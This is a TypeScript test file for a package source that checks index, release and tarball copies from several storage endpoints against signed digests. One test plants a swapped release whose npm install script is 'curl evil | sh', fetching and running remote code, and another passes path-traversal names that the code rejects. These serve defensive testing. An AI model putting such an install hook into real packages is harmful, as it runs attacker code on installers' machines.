// PackageSource with the verifier (ADR 0003): every index copy is a candidate, the highest valid
// sequence wins, a release and a tarball come from the first endpoint with the signed digest, and
// the errors tell the shim 404 (absent) from 502 (no usable bytes).
import { beforeEach, expect, test } from 'bun:test';
import type { DidDocument } from '../../src/did/types.ts';
import {
  MAX_JSON_BYTES, MAX_TARBALL_BYTES, PackageSource, SourceError, type ReadOptions, type StorageAdapter, type StoredFile,
} from '../../src/source/index.ts';
import { PolicyError, verifyIndex, verifyRelease, type Pin } from '../../src/trust/index.ts';
import { FakeResolver, MemReader, NAME, didDoc, newKey, publish, reindex, tgz, type Key } from '../trust/sim.ts';

const DID = 'did:example:pub';
const enc = (v: unknown) => new TextEncoder().encode(JSON.stringify(v));
const text = (b: Uint8Array) => new TextDecoder().decode(b);
const fileKey = (f: StoredFile) => (f.kind === 'index' ? 'index' : `${f.version}.${f.kind}`);

/** One storage endpoint. A test can make it hostile, empty, down or slow. */
class Host {
  files = new Map<string, Uint8Array[]>();
  fail?: string;
  /** Fail only the reads of this file. */
  failOn?: string;
  hang = false;
  reads: { file: string; maxBytes: number }[] = [];

  /** The same signed bytes as the publisher store, as every adapter stores them. */
  static from(mem: MemReader): Host {
    const host = new Host();
    const head = mem.indexes.get(`${DID}/${NAME}`);
    if (head) host.files.set('index', [enc(head)]);
    for (const [key, release] of mem.releases) host.files.set(`${key.split('@')[1]}.release`, [enc(release)]);
    for (const [key, bytes] of mem.tarballs) host.files.set(`${key.split('@')[1]}.tarball`, [bytes]);
    return host;
  }
}

const adapter = (hosts: Record<string, Host>): StorageAdapter => ({
  kind: 'fake',
  canRead: (e) => e.url.startsWith('fake://'),
  reader: (e) => ({
    async *read(file: StoredFile, o: ReadOptions) {
      const host = hosts[e.url]!;
      host.reads.push({ file: fileKey(file), maxBytes: o.maxBytes });
      if (host.hang) await new Promise((_, reject) => o.signal.addEventListener('abort', () => reject(o.signal.reason)));
      if (host.fail && (!host.failOn || host.failOn === fileKey(file))) throw new Error(host.fail);
      yield* host.files.get(fileKey(file)) ?? [];
    },
  }),
});

let key: Key;
let mem: MemReader;
beforeEach(async () => {
  key = await newKey(DID, 'didpkg-1');
  mem = new MemReader();
  await publish(mem, { did: DID, version: '1.0.0', tarball: tgz('1.0.0'), signers: [key.signer] });
});

// A URL with a trailing "/" is a mirror, else a DWN. The mirrors come first in the document.
function make(hosts: Record<string, Host>, more: unknown[] = [], jsonTimeoutMs?: number) {
  const urls = Object.keys(hosts);
  const resolver = new FakeResolver();
  resolver.docs.set(DID, {
    doc: {
      ...didDoc(DID, [key]),
      service: [
        { id: '#pkg', type: 'DIDPackageRepository', serviceEndpoint: urls.filter((u) => u.endsWith('/')) },
        { id: '#dwn', type: 'DecentralizedWebNode', serviceEndpoint: urls.filter((u) => !u.endsWith('/')) },
        ...more,
      ],
    } as DidDocument,
  });
  const log: string[] = [];
  const source = new PackageSource({ resolver, adapters: [adapter(hosts)], log: (l) => log.push(l), jsonTimeoutMs });
  const index = () => verifyIndex({ did: DID, name: NAME, resolver, reader: source, trust: new Map<string, Pin>() });
  const release = (version = '1.0.0') => verifyRelease({ did: DID, name: NAME, version, resolver, reader: source, trust: new Map<string, Pin>() });
  return { source, log, index, release };
}

/** The code of the SourceError or PolicyError that `run` throws, or `ok`. */
async function codeOf(run: () => unknown): Promise<string> {
  try {
    await run();
  } catch (e) {
    if (e instanceof SourceError || e instanceof PolicyError) return e.code;
    throw e;
  }
  return 'ok';
}

test('the DWN endpoints come first; an endpoint with no adapter is skipped', async () => {
  const { source, log } = make({ 'fake://m1/': Host.from(mem), 'fake://dwn': Host.from(mem) },
    [{ id: '#web', type: 'DIDPackageRepository', serviceEndpoint: 'https://web.example/' }]);
  expect((await source.endpoints(DID)).map((e) => e.url)).toEqual(['fake://dwn', 'fake://m1/']);
  expect(log).toEqual(['skip https://web.example/: no adapter reads it']);
  expect(await source.endpoints('did:example:unknown')).toEqual([]);
});

test('the index comes from every endpoint; the release and the tarball from the first match', async () => {
  const dwn = Host.from(mem);
  const m1 = Host.from(mem);
  const r = await make({ 'fake://dwn': dwn, 'fake://m1/': m1 }).release();
  expect(text(r.tarball)).toBe('fake-tgz:1.0.0');
  expect(dwn.reads).toEqual([
    { file: 'index', maxBytes: MAX_JSON_BYTES },
    { file: '1.0.0.release', maxBytes: MAX_JSON_BYTES },
    { file: '1.0.0.tarball', maxBytes: MAX_TARBALL_BYTES },
  ]);
  expect(m1.reads.map((x) => x.file)).toEqual(['index']);
});

test('the highest valid sequence wins, in each endpoint order', async () => {
  const stale = Host.from(mem);
  await publish(mem, { did: DID, version: '1.1.0', tarball: tgz('1.1.0'), signers: [key.signer] });
  const fresh = Host.from(mem);
  for (const hosts of [{ 'fake://dwn': stale, 'fake://m1/': fresh }, { 'fake://dwn': fresh, 'fake://m1/': stale }]) {
    const { index, release } = make(hosts);
    expect((await index()).index.sequence).toBe(2);
    expect(text((await release('1.1.0')).tarball)).toBe('fake-tgz:1.1.0'); // the stale host has no 1.1.0: next host
  }
});

test('a forged index with a higher sequence loses; its release and tarball are skipped', async () => {
  const thief = await newKey(DID, 'didpkg-1');
  const forged = new MemReader();
  await publish(forged, { did: DID, version: '1.0.0', tarball: tgz('evil'), signers: [thief.signer] });
  await reindex(forged, { did: DID, signers: [thief.signer], sequence: 99 });
  const { index, release, log } = make({ 'fake://dwn': Host.from(forged), 'fake://m1/': Host.from(mem) });
  expect((await index()).index.sequence).toBe(1);
  expect(text((await release()).tarball)).toBe('fake-tgz:1.0.0');
  expect(log.filter((l) => l.includes('fake://dwn'))).toEqual([
    'the release hello@1.0.0 from fake://dwn: the copy is not the signed copy, try the next copy',
    'the tarball hello@1.0.0 from fake://dwn: the copy is not the signed copy, try the next copy',
  ]);
});

test('if no index copy is valid, the error of the first copy is the result', async () => {
  const thief = await newKey(DID, 'didpkg-1');
  const forged = new MemReader();
  await publish(forged, { did: DID, version: '1.0.0', tarball: tgz('evil'), signers: [thief.signer] });
  const schema = new Host();
  schema.files.set('index', [enc({ type: 'DidPkgIndex' })]);
  expect(await codeOf(make({ 'fake://dwn': schema, 'fake://m1/': Host.from(forged) }).index)).toBe('INDEX_SCHEMA');
  expect(await codeOf(make({ 'fake://dwn': Host.from(forged), 'fake://m1/': schema }).index)).toBe('INDEX_SIGNATURE');
});

test('a DWN can hold several copies (names are not unique); each copy is a candidate', async () => {
  const dwn = Host.from(mem);
  await reindex(mem, { did: DID, signers: [key.signer] });
  dwn.files.set('index', [...dwn.files.get('index')!, ...Host.from(mem).files.get('index')!]);
  const { source, index } = make({ 'fake://dwn': dwn });
  expect((await source.getIndexes(DID, NAME)).length).toBe(2);
  expect((await index()).index.sequence).toBe(2);
});

test('a swapped release or tarball on the first endpoint: the next endpoint gives the signed copy', async () => {
  const dwn = Host.from(mem);
  const release = JSON.parse(text(dwn.files.get('1.0.0.release')![0]!));
  dwn.files.set('1.0.0.release', [enc({ ...release, npm: { scripts: { install: 'curl evil | sh' } } })]);
  dwn.files.set('1.0.0.tarball', [tgz('swapped')]);
  const r = await make({ 'fake://dwn': dwn, 'fake://m1/': Host.from(mem) }).release();
  expect(text(r.tarball)).toBe('fake-tgz:1.0.0');
  expect(r.release.npm).toEqual({ dependencies: {}, hasInstallScript: false });
});

test('if every copy is swapped, the result is MISMATCH (502) and no bytes reach the verifier', async () => {
  const hosts = { 'fake://dwn': Host.from(mem), 'fake://m1/': Host.from(mem) };
  for (const h of Object.values(hosts)) h.files.set('1.0.0.tarball', [tgz('swapped')]);
  expect(await codeOf(make(hosts).release)).toBe('MISMATCH');
});

test('UNAVAILABLE (502) only if no endpoint gave a copy; all empty is absent (404)', async () => {
  const down = () => Object.assign(new Host(), { fail: 'connect ECONNREFUSED' });
  const junk = new Host();
  junk.files.set('index', [new TextEncoder().encode('<html>')]);
  expect(await codeOf(make({ 'fake://dwn': down(), 'fake://m1/': Host.from(mem) }).release)).toBe('ok');
  expect(await codeOf(make({ 'fake://dwn': down(), 'fake://m1/': new Host() }).index)).toBe('UNAVAILABLE');
  expect(await codeOf(make({ 'fake://dwn': junk }).index)).toBe('UNAVAILABLE');
  expect(await codeOf(make({ 'fake://dwn': new Host(), 'fake://m1/': new Host() }).index)).toBe('INDEX_MISSING');
  expect(await codeOf(make({}).index)).toBe('INDEX_MISSING');
  const noTarball = Host.from(mem);
  noTarball.files.delete('1.0.0.tarball');
  expect(await codeOf(make({ 'fake://dwn': noTarball }).release)).toBe('TARBALL_MISSING');
  const tarballDown = Object.assign(Host.from(mem), { fail: 'HTTP 503', failOn: '1.0.0.tarball' });
  expect(await codeOf(make({ 'fake://dwn': tarballDown, 'fake://m1/': noTarball }).release)).toBe('UNAVAILABLE');
});

test('a copy larger than the limit is refused, even if the adapter sends it', async () => {
  const big = Host.from(mem);
  big.files.set('index', [new Uint8Array(MAX_JSON_BYTES + 1)]);
  const { source, log } = make({ 'fake://dwn': big, 'fake://m1/': Host.from(mem) });
  expect((await source.getIndexes(DID, NAME)).length).toBe(1);
  expect(log).toEqual([`the index of hello from fake://dwn: a copy is larger than ${MAX_JSON_BYTES} bytes`]);
});

test('a slow endpoint times out; the other endpoints still answer', async () => {
  const slow = Object.assign(Host.from(mem), { hang: true });
  const { source, log } = make({ 'fake://dwn': slow, 'fake://m1/': Host.from(mem) }, [], 20);
  expect((await source.getIndexes(DID, NAME)).length).toBe(1);
  expect(log.length).toBe(1);
});

test('a bad name or version is a caller bug and never reaches an adapter', async () => {
  const host = Host.from(mem);
  const { source } = make({ 'fake://dwn': host });
  const dist = { integrity: 'sha512-x', size: 1 };
  await expect(source.getIndexes(DID, '../x')).rejects.toBeInstanceOf(TypeError);
  await expect(source.getRelease(DID, NAME, '1.0.0/../../x', 'd')).rejects.toBeInstanceOf(TypeError);
  await expect(source.getTarball(DID, 'Hello', '1.0.0', dist)).rejects.toBeInstanceOf(TypeError);
  expect(host.reads).toEqual([]);
});

test('a release with the signed digest is read one time; a copy with another digest is not kept', async () => {
  const dwn = Host.from(mem);
  const good = dwn.files.get('1.0.0.release')!;
  dwn.files.set('1.0.0.release', [enc({ swapped: true })]);
  const { release, source } = make({ 'fake://dwn': dwn });
  expect(await codeOf(release)).toBe('MISMATCH');
  dwn.files.set('1.0.0.release', good);
  await release();
  await release();
  // The kept copy is a copy: a later change to the adapter buffer does not change it.
  good[0]!.fill(0);
  expect((await release()).release.version).toBe('1.0.0');
  // The digest is part of the key: another signed digest for the version does not get the kept copy.
  expect(await codeOf(() => source.getRelease(DID, NAME, '1.0.0', 'sha256-other'))).toBe('MISMATCH');
  expect(dwn.reads.filter((r) => r.file === '1.0.0.release').length).toBe(3);
  expect(dwn.reads.filter((r) => r.file === '1.0.0.tarball').length).toBe(3);
});
